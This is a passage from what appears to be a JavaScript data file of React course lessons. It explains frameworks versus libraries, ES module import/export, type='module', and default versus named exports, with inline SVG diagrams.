                    <text x="92" y="102" text-anchor="middle" class="svg-node" style="fill:var(--primary); font-weight:700;">Framework</text>
                    <text x="92" y="124" text-anchor="middle" class="svg-mono-xs">Next.js Engine</text>

                    <path d="M 170 114 L 215 114" class="svg-arrow" stroke="var(--primary)"/>
                    <text x="192" y="105" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-size:10px;">calls</text>

                    <rect x="225" y="74" width="145" height="80" rx="8" fill="var(--bg-surface)" stroke="var(--primary)"/>
                    <text x="297" y="102" text-anchor="middle" class="svg-node">YOUR CODE</text>
                    <text x="297" y="124" text-anchor="middle" class="svg-sub">Plugged into lifecycle</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "3.3",
          title: "The House Analogy (Ready-Made Flat vs. Buying a Plot)",
          content: `
            <div class="callout-highlight-box">
              <span class="callout-highlight-tag">How to Remember the Difference Forever</span>
              <p style="margin-top:0.4rem; color:var(--text-secondary);">
                Think about getting a place to live: a <strong>Framework</strong> is like moving into a <strong>Ready-Made Flat</strong>, whereas a <strong>Library</strong> is like buying an <strong>Empty Plot of Land</strong>.
              </p>
            </div>

            <div class="sub-card-grid-2" style="margin-top:1.25rem;">
              <div class="sub-box">
                <div class="sub-box__tag">Analogy 01 · Framework</div>
                <div class="sub-box__title">🏢 Buying a Ready-Made Flat</div>
                <div class="sub-box__body">
                  <ul class="notes-sub-list" style="padding-left:1rem;">
                    <li><strong>Pre-Constructed:</strong> The rooms, kitchen, pipes, and walls are already built and hooked together.</li>
                    <li><strong>Quick Setup:</strong> You move in instantly without having to hire architects or plumbers.</li>
                    <li><strong>Limited Customization:</strong> If you want to demolish a wall between two bedrooms to make a giant gaming hall, the building regulations and surrounding flats forbid it!</li>
                    <li><strong>Real Example:</strong> Next.js gives you routing, compilation, and SSR out of the box, but you must adhere to its file-based routing rules.</li>
                  </ul>
                </div>
              </div>

              <div class="sub-box">
                <div class="sub-box__tag">Analogy 02 · Library</div>
                <div class="sub-box__title">🏞️ Buying an Empty Plot of Land</div>
                <div class="sub-box__body">
                  <ul class="notes-sub-list" style="padding-left:1rem;">
                    <li><strong>Zero Pre-Imposed Walls:</strong> You start with bare ground and design your house entirely on your own terms.</li>
                    <li><strong>Total Architectural Freedom:</strong> If you want a massive master bathroom with showers stretching across the floor, you can build it exactly that way!</li>
                    <li><strong>Modular Choices:</strong> You pick your own bricks (React for UI), your own lighting (GSAP for animations), and your own flooring (Lenis for smooth scrolling).</li>
                    <li><strong>Real Example:</strong> React only cares about rendering UI; you freely choose Redux/Zustand for state and React Router for URLs.</li>
                  </ul>
                </div>
              </div>
            </div>

            <figure class="diagram-frame" style="margin-top:1.25rem;">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 3.2 · The House Analogy: Ready-Made Flat (Framework) vs. Empty Plot (Library)</span>
                <span class="diagram-frame-tag">MENTAL MODEL ILLUSTRATION</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 250" class="arch-svg" role="img" aria-label="Diagram showing House Analogy: Ready-made flat representing Framework with fixed layout vs Empty plot representing Library with total customization">
                  <!-- FLAT (FRAMEWORK) -->
                  <g transform="translate(30, 20)">
                    <rect x="0" y="0" width="395" height="210" rx="12" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <text x="197" y="32" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">FRAMEWORK = READY-MADE FLAT (NEXT.JS, ANGULAR)</text>
                    <text x="197" y="56" text-anchor="middle" class="svg-title">Pre-Built Layout & Rigid Walls</text>

                    <!-- Flat Layout Box -->
                    <rect x="25" y="74" width="345" height="70" rx="8" fill="var(--bg-surface)" stroke="var(--border-strong)"/>
                    <rect x="35" y="84" width="95" height="50" rx="4" fill="var(--primary-bg)" stroke="var(--primary)"/>
                    <text x="82" y="112" text-anchor="middle" class="svg-mono-xs" style="font-size:11px;">Fixed Room 1</text>
                    <rect x="140" y="84" width="105" height="50" rx="4" fill="var(--primary-bg)" stroke="var(--primary)"/>
                    <text x="192" y="112" text-anchor="middle" class="svg-mono-xs" style="font-size:11px;">Fixed Kitchen</text>
                    <rect x="255" y="84" width="105" height="50" rx="4" fill="var(--primary-bg)" stroke="var(--primary)"/>
                    <text x="307" y="112" text-anchor="middle" class="svg-mono-xs" style="font-size:11px;">Fixed Bath</text>

                    <rect x="25" y="154" width="345" height="46" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="197" y="174" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:600;">Fast move-in · Zero setup</text>
                    <text x="197" y="190" text-anchor="middle" class="svg-sub" style="fill:var(--warning);">Cannot break walls or alter structure</text>
                  </g>

                  <!-- PLOT (LIBRARY) -->
                  <g transform="translate(455, 20)">
                    <rect x="0" y="0" width="395" height="210" rx="12" fill="var(--bg-subsection)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="197" y="32" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">LIBRARY = EMPTY PLOT OF LAND (REACTJS)</text>
                    <text x="197" y="56" text-anchor="middle" class="svg-title">Total Flexibility & Custom Design</text>

                    <!-- Plot Custom Box -->
                    <rect x="25" y="74" width="345" height="70" rx="8" fill="var(--bg-surface)" stroke="var(--success)" stroke-dasharray="4 3"/>
                    <rect x="35" y="84" width="145" height="50" rx="6" fill="var(--success-bg)" stroke="var(--success)"/>
                    <text x="107" y="105" text-anchor="middle" class="svg-node" style="fill:var(--success); font-size:12px;">ReactJS UI</text>
                    <text x="107" y="122" text-anchor="middle" class="svg-mono-xs" style="font-size:10px;">Custom size!</text>

                    <rect x="190" y="84" width="85" height="50" rx="6" fill="var(--accent-light)" stroke="var(--accent)"/>
                    <text x="232" y="105" text-anchor="middle" class="svg-node" style="font-size:11px;">GSAP</text>
                    <text x="232" y="122" text-anchor="middle" class="svg-mono-xs" style="font-size:10px;">Animations</text>

                    <rect x="285" y="84" width="75" height="50" rx="6" fill="var(--accent-gold-bg)" stroke="var(--accent-gold)"/>
                    <text x="322" y="105" text-anchor="middle" class="svg-node" style="font-size:11px;">Lenis</text>
                    <text x="322" y="122" text-anchor="middle" class="svg-mono-xs" style="font-size:10px;">Scroll</text>

                    <rect x="25" y="154" width="345" height="46" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="197" y="174" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:600;">100% Architectural Freedom</text>
                    <text x="197" y="190" text-anchor="middle" class="svg-sub">Plug in any tool exactly how you want</text>
                  </g>
                </svg>
              </div>
            </figure>

            <div class="callout-highlight-box" style="margin-top:1.25rem;">
              <span class="callout-highlight-tag">The Golden Rule</span>
              <p style="margin-top:0.4rem; color:var(--text-secondary); font-weight:500;">
                <strong>Library</strong> = A targeted tool for each specific feature (full customization, you call the code).<br>
                <strong>Framework</strong> = An all-in-one pre-built structure (strict conventions, framework calls your code).
              </p>
            </div>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 4: WHY IMPORT & EXPORT ARE NEEDED & ENABLING MODULES
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-04-import-export-modules",
      number: "04",
      shortLabel: "Import, Export & Modules",
      title: "Why Import & Export Are Needed & Enabling Modules",
      summary: "The multi-file isolation bottleneck (app.js vs script.js), sending and receiving data across files, and enabling ES6 modules via type=\"module\".",
      subtopicLabels: ["4.1 Multi-File Problem", "4.2 Import & Export", "4.3 type=\"module\""],
      diagramCount: 2,
      sections: [
        {
          num: "4.1",
          title: "The Multi-File Problem (Lexical File Isolation)",
          content: `
            <div class="callout-highlight-box">
              <span class="callout-highlight-tag">The Multi-File Dilemma</span>
              <p style="margin-top:0.4rem; color:var(--text-secondary);">
                Before jumping into React components, we must understand how code communicates across multiple JavaScript files.
              </p>
            </div>

            <ul class="notes-bullet-list" style="margin-top:1rem;">
              <li><strong>The Scenario:</strong>
                <ul class="notes-sub-list">
                  <li>Suppose your project has two separate JavaScript files: <code>app.js</code> and <code>script.js</code> (linked in your <code>index.html</code>).</li>
                  <li>Inside <code>app.js</code>, you define a variable:
                    <pre style="background:var(--bg-frame); padding:0.6rem 0.85rem; border-radius:6px; border:1px solid var(--border); font-family:var(--font-mono); font-size:0.85rem; margin:0.4rem 0;">var a = 20;</pre>
                  </li>
                  <li>Inside <code>script.js</code>, you attempt to print that variable to the browser console:
                    <pre style="background:var(--bg-frame); padding:0.6rem 0.85rem; border-radius:6px; border:1px solid var(--border); font-family:var(--font-mono); font-size:0.85rem; margin:0.4rem 0;">console.log(a);</pre>
                  </li>
                </ul>
              </li>
              <li><strong>What Happens in the Console?</strong>
                <ul class="notes-sub-list">
                  <li>You instantly get a runtime crash: <code style="color:var(--danger); font-weight:600;">Uncaught ReferenceError: a is not defined</code>.</li>
                </ul>
              </li>
              <li><strong>Why Does This Happen?</strong>
                <ul class="notes-sub-list">
                  <li>By default, each JavaScript file has its own isolated file scope or executes in a separate lexical context.</li>
                  <li><code>script.js</code> has zero access or visibility into variables created inside <code>app.js</code> unless a bridge is explicitly constructed.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 4.1 · Multi-File Isolation Problem vs. ES Module Export/Import Bridge</span>
                <span class="diagram-frame-tag">CROSS-FILE DATA COMMUNICATION</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Diagram showing isolated files causing ReferenceError on the left vs ES6 module export and import bridge allowing data flow on the right">
                  <!-- LEFT: Without Import/Export -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="12" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.6"/>
                    <text x="200" y="30" text-anchor="middle" class="svg-kicker" style="fill:var(--danger); font-weight:700;">DEFAULT ISOLATION (NO BRIDGE)</text>
                    <text x="200" y="52" text-anchor="middle" class="svg-title" style="fill:var(--danger);">Multi-File ReferenceError</text>

                    <!-- File 1: app.js -->
                    <rect x="25" y="70" width="150" height="60" rx="8" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="100" y="92" text-anchor="middle" class="svg-mono-xs" style="font-weight:700;">📄 app.js</text>
                    <text x="100" y="112" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-muted);">var a = 20;</text>

                    <!-- Wall Barrier -->
                    <line x1="200" y1="70" x2="200" y2="130" stroke="var(--danger)" stroke-width="2.5" stroke-dasharray="4 4"/>
                    <text x="200" y="104" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-size:9px;">WALL</text>

                    <!-- File 2: script.js -->
                    <rect x="225" y="70" width="150" height="60" rx="8" fill="var(--bg-surface)" stroke="var(--danger)"/>
                    <text x="300" y="92" text-anchor="middle" class="svg-mono-xs" style="font-weight:700;">📄 script.js</text>
                    <text x="300" y="112" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger);">console.log(a);</text>

                    <rect x="25" y="142" width="350" height="36" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
                    <text x="200" y="165" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:600;">💥 ReferenceError: a is not defined</text>
                  </g>

                  <!-- RIGHT: With Import/Export -->
                  <g transform="translate(455, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="12" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="200" y="30" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">WITH ES6 MODULES (EXPLICIT CONTRACT)</text>
                    <text x="200" y="52" text-anchor="middle" class="svg-title" style="fill:var(--success);">Seamless Cross-File Data Flow</text>

                    <!-- File 1: app.js with Export -->
                    <rect x="25" y="70" width="155" height="60" rx="8" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="102" y="92" text-anchor="middle" class="svg-mono-xs" style="font-weight:700; fill:var(--success);">📄 app.js (Sender)</text>
                    <text x="102" y="112" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:600;">export default a;</text>

                    <!-- Arrow Bridge -->
                    <path d="M 185 100 L 220 100" class="svg-arrow" stroke="var(--success)"/>
                    <text x="202" y="92" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-size:9px;">data</text>

                    <!-- File 2: script.js with Import -->
                    <rect x="225" y="70" width="155" height="60" rx="8" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="302" y="92" text-anchor="middle" class="svg-mono-xs" style="font-weight:700; fill:var(--success);">📄 script.js (Receiver)</text>
                    <text x="302" y="112" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:600;">import a from './app'</text>

                    <rect x="25" y="142" width="350" height="36" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="200" y="165" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:600;">✓ Output: 20 printed perfectly in console</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "4.2",
          title: "What Are Import and Export?",
          content: `
            <p style="color:var(--text-secondary); margin-bottom:1rem;">
              <strong>Import</strong> and <strong>Export</strong> are the official ES6 mechanism allowing JavaScript files to share, send, and receive data cleanly between one another:
            </p>

            <div class="sub-card-grid-2">
              <div class="sub-box">
                <div class="sub-box__tag">Action 01 · Giver</div>
                <div class="sub-box__title">📤 Export = Giving / Sending</div>
                <div class="sub-box__body">
                  <ul class="notes-sub-list" style="padding-left:1rem;">
                    <li><strong>Role:</strong> Makes variables, functions, arrays, objects, or components available to the outside world.</li>
                    <li><strong>Example:</strong> In <code>app.js</code>, writing <code>export default a</code> gives permission to other files to borrow <code>a</code>.</li>
                    <li><strong>Analogy:</strong> Like setting up an outbound parcel delivery dispatch center.</li>
                  </ul>
                </div>
              </div>

              <div class="sub-box">
                <div class="sub-box__tag">Action 02 · Receiver</div>
                <div class="sub-box__title">📥 Import = Taking / Receiving</div>
                <div class="sub-box__body">
                  <ul class="notes-sub-list" style="padding-left:1rem;">
                    <li><strong>Role:</strong> Pulls in exported data from another file into the current file's execution scope.</li>
                    <li><strong>Example:</strong> In <code>script.js</code>, writing <code>import a from './app.js'</code> receives that parcel and makes <code>a</code> ready to use.</li>
                    <li><strong>Analogy:</strong> Like accepting the delivered package at your doorstep and opening it.</li>
                  </ul>
                </div>
              </div>
            </div>
          `
        },
        {
          num: "4.3",
          title: "Enabling Modules with type=\"module\"",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>The Browser Default Limitation:</strong>
                <ul class="notes-sub-list">
                  <li>By default, a standard HTML script tag like <code>&lt;script src="script.js"&gt;&lt;/script&gt;</code> runs as a traditional, non-modular script.</li>
                  <li>If you write <code>import</code> or <code>export</code> inside a normal script, the browser rejects it with:
                    <br><code style="color:var(--danger); font-weight:600;">Uncaught SyntaxError: Cannot use import statement outside a module</code>.
                  </li>
                </ul>
              </li>
              <li><strong>How to Enable Modules in HTML:</strong>
                <ul class="notes-sub-list">
                  <li>You must explicitly tell the browser that the JavaScript file is an ES6 Module by adding <strong><code>type="module"</code></strong>:</li>
                </ul>
                <pre style="background:var(--bg-frame); padding:0.75rem 1rem; border-radius:6px; border:1px solid var(--border); font-family:var(--font-mono); font-size:0.88rem; margin:0.6rem 0;">&lt;script type="module" src="script.js"&gt;&lt;/script&gt;</pre>
              </li>
              <li><strong>Key Architectural Superpowers of <code>type="module"</code>:</strong>
                <ul class="notes-sub-list">
                  <li><strong>Native Import / Export:</strong> Unlocks modern modular syntax natively in all modern browsers without requiring Webpack, Babel, or Vite during early learning.</li>
                  <li><strong>Automatic Strict Mode:</strong> Modules automatically execute in <code>'use strict'</code> mode, eliminating silent bugs and legacy quirks.</li>
                  <li><strong>Isolated Top-Level Scope:</strong> Variables declared at the top level of a module do NOT pollute the global <code>window</code> object.</li>
                  <li><strong>Automatic Deferred Execution:</strong> Module scripts download in parallel with HTML parsing and execute automatically after the DOM is ready (identical to <code>defer</code>).</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame" style="margin-top:1.25rem;">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 4.2 · The type="module" Browser Pipeline & Strict Execution Environment</span>
                <span class="diagram-frame-tag">BROWSER RUNTIME ARCHITECTURE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 210" class="arch-svg" role="img" aria-label="Diagram showing browser HTML parser encountering type module, resolving dependency graph, enabling strict mode, and executing imports cleanly">
                  <!-- Step 1: HTML Tag -->
                  <g transform="translate(30, 25)">
                    <rect x="0" y="0" width="240" height="160" rx="10" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.5"/>
                    <text x="120" y="30" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">HTML ENTRYPOINT</text>
                    <text x="120" y="54" text-anchor="middle" class="svg-title">script type="module"</text>
                    <rect x="15" y="70" width="210" height="42" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="120" y="96" text-anchor="middle" class="svg-mono-xs">&lt;script type="module" ...&gt;</text>
                    <text x="120" y="132" text-anchor="middle" class="svg-sub">Informs browser JS engine</text>
                    <text x="120" y="148" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent);">Auto-deferred execution</text>
                  </g>

                  <!-- Arrow 1 -->
                  <g transform="translate(275, 95)">
                    <line x1="0" y1="10" x2="35" y2="10" stroke="var(--accent)" stroke-width="2"/>
                    <polygon points="35,5 45,10 35,15" fill="var(--accent)"/>
                  </g>

                  <!-- Step 2: Dependency Resolution -->
                  <g transform="translate(325, 25)">
                    <rect x="0" y="0" width="240" height="160" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.5"/>
                    <text x="120" y="30" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">BROWSER LOADER</text>
                    <text x="120" y="54" text-anchor="middle" class="svg-title">Module Graph Fetch</text>
                    <rect x="15" y="70" width="210" height="42" rx="6" fill="var(--primary-bg)" stroke="var(--primary)"/>
                    <text x="120" y="96" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:600;">Fetches ./app.js via HTTP</text>
                    <text x="120" y="132" text-anchor="middle" class="svg-sub">Pre-parses export signatures</text>
                    <text x="120" y="148" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary);">Builds module dependency tree</text>
                  </g>

                  <!-- Arrow 2 -->
                  <g transform="translate(570, 95)">
                    <line x1="0" y1="10" x2="35" y2="10" stroke="var(--success)" stroke-width="2"/>
                    <polygon points="35,5 45,10 35,15" fill="var(--success)"/>
                  </g>

                  <!-- Step 3: Strict Execution -->
                  <g transform="translate(620, 25)">
                    <rect x="0" y="0" width="230" height="160" rx="10" fill="var(--bg-subsection)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="115" y="30" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">RUNTIME SANDBOX</text>
                    <text x="115" y="54" text-anchor="middle" class="svg-title">Strict Mode Execution</text>
                    <rect x="15" y="70" width="200" height="42" rx="6" fill="var(--success-bg)" stroke="var(--success)"/>
                    <text x="115" y="96" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:600;">'use strict' enforced</text>
                    <text x="115" y="132" text-anchor="middle" class="svg-sub">No window pollution</text>
                    <text x="115" y="148" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:600;">✓ Safe Component Architecture</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 5: DEFAULT EXPORT VS. NAMED EXPORT
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-05-default-vs-named-export",
      number: "05",
      shortLabel: "Default vs. Named Export",
      title: "Default Export vs. Named Export",
      summary: "Single primary exports with flexible alias naming (export default) vs multiple exact-match exports ({ named }), and combining both in a single module.",
      subtopicLabels: ["5.1 Export Types", "5.2 Default Export", "5.3 Named Export", "5.4 Combined Imports", "5.5 Summary"],
      diagramCount: 2,
      sections: [
        {
          num: "5.1",
          title: "Two Types of Exports in JavaScript",
          content: `
            <p style="color:var(--text-secondary); margin-bottom:1rem;">
              Whenever you share data from a JavaScript file, ES Modules give you <strong>two distinct export flavors</strong>:
            </p>

            <div class="sub-card-grid-2">
              <div class="sub-box">
                <div class="sub-box__tag">Type 01 · Single Primary</div>
                <div class="sub-box__title">⭐ Default Export</div>
                <div class="sub-box__body">
                  Exporting <strong>one main, primary value</strong> as the signature payload of that file. Imported with any custom name, with <strong>no curly braces</strong>.
                </div>
              </div>

              <div class="sub-box">
                <div class="sub-box__tag">Type 02 · Multiple Exact</div>
                <div class="sub-box__title">🏷️ Named Export</div>
                <div class="sub-box__body">
                  Exporting <strong>multiple specific values</strong> by their exact variable names. Imported inside <strong>curly braces <code>{}</code></strong> matching their exact exported identifier.
                </div>
              </div>
            </div>
          `
        },
        {
          num: "5.2",
          title: "Default Export (export default)",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>When to Use:</strong> When a file is dedicated to one primary entity—like a major React component (e.g. <code>App</code>, <code>Navbar</code>) or a single config object.</li>
              <li><strong>How to Export (in <code>app.js</code>):</strong>
                <pre style="background:var(--bg-frame); padding:0.65rem 0.85rem; border-radius:6px; border:1px solid var(--border); font-family:var(--font-mono); font-size:0.85rem; margin:0.4rem 0;">const a = 10;
export default a;</pre>
              </li>
              <li><strong>How to Import (in <code>script.js</code>):</strong>
                <pre style="background:var(--bg-frame); padding:0.65rem 0.85rem; border-radius:6px; border:1px solid var(--border); font-family:var(--font-mono); font-size:0.85rem; margin:0.4rem 0;">import a from './app.js';</pre>
              </li>
              <li><strong>The Flexible Naming Rule (Super Important!):</strong>
                <ul class="notes-sub-list">
                  <li>Because <code>app.js</code> sends only <strong>one single default export</strong>, there is zero ambiguity about what is being received.</li>
                  <li>Therefore, the receiving file can assign it <strong>ANY custom name</strong> during import!</li>
                  <li>All of the following work identically:
                    <pre style="background:var(--bg-frame); padding:0.65rem 0.85rem; border-radius:6px; border:1px solid var(--border); font-family:var(--font-mono); font-size:0.85rem; margin:0.4rem 0;">import b from './app.js';        // Works! b = 10
import chacha from './app.js';   // Works! chacha = 10
import username from './app.js'; // Works! username = 10</pre>
                  </li>
                </ul>
              </li>
              <li><strong>Real-World Example (<code>arr</code> vs <code>user</code>):</strong>
                <ul class="notes-sub-list">
                  <li>Suppose <code>app.js</code> declares an array <code>arr</code> and a variable <code>const user = 'Sarthak'</code>, but only writes <code>export default arr</code>.</li>
                  <li>In <code>script.js</code>, <code>import array from './app.js'</code> successfully prints the array.</li>
                  <li>However, attempting to access <code>user</code> in <code>script.js</code> throws <code style="color:var(--danger);">user is not defined</code> because <code>user</code> was never exported!</li>
                  <li>If you change <code>app.js</code> to <code>export default user</code>, importing <code>import username from './app.js'</code> will output <code>'Sarthak'</code>.</li>
                </ul>
              </li>
              <li><strong>Hard Limit:</strong> A file can have at most <strong>ONE default export</strong>. Attempting multiple <code>export default</code> statements throws a SyntaxError.</li>
            </ul>
          `
        },
        {
          num: "5.3",
          title: "Named Export (export const ...)",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>When to Use:</strong> When a file contains <strong>multiple helper utilities, icons, functions, or constants</strong> that multiple consumers might need individually.</li>
              <li><strong>How to Export (in <code>app.js</code>):</strong>
                <ul class="notes-sub-list">
                  <li>Simply prepend the keyword <strong><code>export</code></strong> right in front of your variable or function declaration:</li>
                </ul>
                <pre style="background:var(--bg-frame); padding:0.65rem 0.85rem; border-radius:6px; border:1px solid var(--border); font-family:var(--font-mono); font-size:0.85rem; margin:0.4rem 0;">export const arr = [10, 20, 30, 40];
export const API_URL = 'https://api.example.com';</pre>
              </li>
              <li><strong>How to Import (in <code>script.js</code>):</strong>
                <ul class="notes-sub-list">
                  <li>You <strong>MUST wrap the imported identifiers in curly braces <code>{}</code></strong>:</li>
                </ul>
                <pre style="background:var(--bg-frame); padding:0.65rem 0.85rem; border-radius:6px; border:1px solid var(--border); font-family:var(--font-mono); font-size:0.85rem; margin:0.4rem 0;">import { arr, API_URL } from './app.js';</pre>
              </li>
              <li><strong>The Strict Naming Rule:</strong>
                <ul class="notes-sub-list">
                  <li>Unlike default imports, you <strong>cannot rename a named import arbitrarily</strong> inside <code>{}</code> without the explicit <code>as</code> keyword.</li>
                  <li>The name inside <code>{ arr }</code> must <strong>exactly match</strong> the variable name exported from <code>app.js</code>, because JavaScript relies on that name to pull the correct value out of the module's export record.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 5.1 · Default Export (Single Custom Alias) vs. Named Export (Exact Destructuring)</span>
                <span class="diagram-frame-tag">EXPORT PARADIGM COMPARISON</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Diagram contrasting default export with custom import alias vs named exports requiring curly braces and exact matching names">
                  <!-- LEFT: Default Export -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="12" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.6"/>
                    <text x="200" y="30" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">DEFAULT EXPORT (MAX 1 PER FILE)</text>
                    <text x="200" y="52" text-anchor="middle" class="svg-title">Single Channel · Flexible Naming</text>

                    <rect x="25" y="68" width="150" height="56" rx="6" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="100" y="90" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">export default user;</text>
                    <text x="100" y="110" text-anchor="middle" class="svg-sub">user = 'Sarthak'</text>

                    <path d="M 185 96 L 225 96" class="svg-arrow" stroke="var(--accent)"/>

                    <rect x="235" y="68" width="140" height="56" rx="6" fill="var(--accent-light)" stroke="var(--accent)"/>
                    <text x="305" y="90" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">import naam from '...'</text>
                    <text x="305" y="110" text-anchor="middle" class="svg-mono-xs" style="font-size:10px;">No { } needed</text>

                    <rect x="25" y="136" width="350" height="36" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="200" y="159" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:600;">✓ Alias freely: 'naam', 'user', or 'chacha'</text>
                  </g>

                  <!-- RIGHT: Named Export -->
                  <g transform="translate(455, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="12" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <text x="200" y="30" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">NAMED EXPORTS (MULTIPLE PER FILE)</text>
                    <text x="200" y="52" text-anchor="middle" class="svg-title">Multi-Channel · Exact Name Matching</text>

                    <rect x="25" y="68" width="150" height="56" rx="6" fill="var(--primary-bg)" stroke="var(--primary)"/>
                    <text x="100" y="90" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">export const age = 89</text>
                    <text x="100" y="110" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary);">export const skills</text>

                    <path d="M 185 96 L 225 96" class="svg-arrow" stroke="var(--primary)"/>

                    <rect x="235" y="68" width="140" height="56" rx="6" fill="var(--bg-surface)" stroke="var(--primary)"/>
                    <text x="305" y="90" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">import { age, skills }</text>
                    <text x="305" y="110" text-anchor="middle" class="svg-mono-xs" style="font-size:10px;">Strict { } required</text>

                    <rect x="25" y="136" width="350" height="36" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="200" y="159" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:600;">⚠ Names inside { } MUST match exports</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "5.4",
          title: "Combining Default & Multiple Named Exports (Practice Example)",
          content: `
            <p style="color:var(--text-secondary); margin-bottom:1rem;">
              In production React development, you will frequently combine <strong>one default export</strong> (usually the React component) with <strong>multiple named exports</strong> (subcomponents, action creators, or constants) from the exact same file.
            </p>

            <div class="sub-card-grid-2">
              <div class="sub-box">
                <div class="sub-box__tag">File 01 · Producer</div>
                <div class="sub-box__title">app.js (Exporting Everything)</div>
                <div class="sub-box__body">
                  <pre style="background:var(--bg-frame); padding:0.75rem 0.9rem; border-radius:6px; border:1px solid var(--border); font-family:var(--font-mono); font-size:0.82rem; margin:0.4rem 0; overflow-x:auto; max-width:100%;">const user = 'Sarthak';
export const age = 89;
export const skills = [
  'Frontend', 'Backend', 'UI/UX'
];

// Default export at bottom
export default user;</pre>
                </div>
              </div>

              <div class="sub-box">
                <div class="sub-box__tag">File 02 · Consumer</div>
                <div class="sub-box__title">script.js (Single Unified Import)</div>
                <div class="sub-box__body">
                  <pre style="background:var(--bg-frame); padding:0.75rem 0.9rem; border-radius:6px; border:1px solid var(--border); font-family:var(--font-mono); font-size:0.82rem; margin:0.4rem 0; overflow-x:auto; max-width:100%;">// Default first, then named { }
import naam, { age, skills } from './app';

console.log(naam);   // 'Sarthak'
console.log(age);    // 89
console.log(skills);
// ['Frontend', 'Backend', 'UI/UX']</pre>
                </div>
              </div>
            </div>

            <figure class="diagram-frame" style="margin-top:1.25rem;">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 5.2 · Unified Import Architecture: Combining Default & Named Exports</span>
                <span class="diagram-frame-tag">PRODUCTION MODULE PATTERN</span>
              </div>
              <div class="diagram-svg-wrap">
